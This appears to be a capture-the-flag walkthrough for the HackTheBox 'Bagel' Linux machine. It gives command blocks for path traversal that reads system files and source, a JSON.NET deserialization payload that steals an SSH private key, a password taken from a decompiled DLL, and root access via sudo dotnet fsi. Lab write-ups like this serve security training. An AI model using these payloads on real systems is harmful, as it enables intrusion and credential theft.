## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
- **Exploits Used**:
  - [HTTP](HTTP) File Read via Flask route `?page=`
  - Python `proc` analysis to leak source
  - DLL retrieval from .NET server 🎯
  - JSON.NET deserialization exploit in WebSocket 📡
  - Private SSH Key exfiltration 🗝️
  - Pivot to developer via hardcoded creds
  - [dotnet](https://learn.microsoft.com/en-us/dotnet/core/tools/dotnet) F# execution as root via `sudo`

- **Open Ports**:
  - [SSH](SSH) (22)
  - [HTTP](HTTP) (8000) – Flask
  - [HTTP](HTTP) (5000) – WebSocket + .NET Core

---

[Tools](Tools)
- `nmap` 🔍
- `feroxbuster` 🦡
- `ffuf` 🚀
- `curl` 🌐
- `wscat` 📡
- `jq` 🧪
- `dnSpy` 🔬
- `dotnet`, `fsi`, and `bash` 🧠
- `ssh`, `su` 🧑‍💻

---

### Commands to Solve Box

#### 🔍 Recon
```bash
nmap -p- --min-rate 10000 10.10.11.201
nmap -p 22,5000,8000 -sCV 10.10.11.201
feroxbuster -u http://bagel.htb:8000
```

#### 📂 Initial Access (via Flask)
```bash
curl http://bagel.htb:8000/?page=../../../../etc/passwd
curl http://bagel.htb:8000/?page=../../../../proc/self/cmdline
curl http://bagel.htb:8000/?page=../../../../home/developer/app/app.py
```

#### 🧠 DLL Retrieval
```bash
curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o bagel.dll
```
Open with [dnSpy](https://github.com/dnSpy/dnSpy) or `ilspy`.

#### 📡 WebSocket Deserialization
```bash
wscat -c ws://bagel.htb:5000
# Send malicious JSON:
{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../home/phil/.ssh/id_rsa"}}
```

Reformat the key:
```bash
echo $KEY | jq -r . > ~/keys/bagel-phil
chmod 600 ~/keys/bagel-phil
ssh -i ~/keys/bagel-phil phil@bagel.htb
```

#### 🔐 Pivot to developer
```bash
su - developer  # password from DLL: k8wdAYYKyhnjg3K
```

#### 👑 Root via dotnet F#
```bash
sudo dotnet fsi
> System.Diagnostics.Process.Start("bash").WaitForExit();;
```

Alt: Make custom C# app
```bash
mkdir /dev/shm/exploit && cd /dev/shm/exploit
dotnet new console
nano Program.cs  # insert reverse shell or bash
sudo dotnet run
```

---

### ✅ Actions Learned From This Box
- 🐍 How Flask apps can be abused through `?page=` file reads
- 🔍 Reconnaissance with `/proc` to locate running source code
- 📦 Decompiling .NET DLLs to discover vulnerabilities
- 🔓 JSON.NET deserialization bugs via TypeNameHandling 🧨
- 🗝️ Pivoting to users via private key exfiltration
- 💻 F# interactive exploitation for privilege escalation
- 🧰 Rebuilding structured payloads using `jq` and terminal tricks
- 🧪 Understanding .NET internals (runtimeconfig, dll paths, etc.)

---

### References 📚
- 📘 [Json.NET Deserialization Exploit Writeup](https://blog.doyensec.com/2020/02/10/json-deserialization-in-dotnet.html)
- 🧪 [wscat](https://github.com/websockets/wscat)
- 🔐 [F# Interactive (fsi)](https://learn.microsoft.com/en-us/dotnet/fsharp/tutorials/fsi/)
- 💣 [dotnet TypeNameHandling vulnerability](https://www.hanselman.com/blog/remote-code-execution-via-json-deserialization-in-net)
- 📦 [dnSpy GitHub](https://github.com/dnSpy/dnSpy)

---

Let me know when you're ready for another writeup! 🧠🔥🥯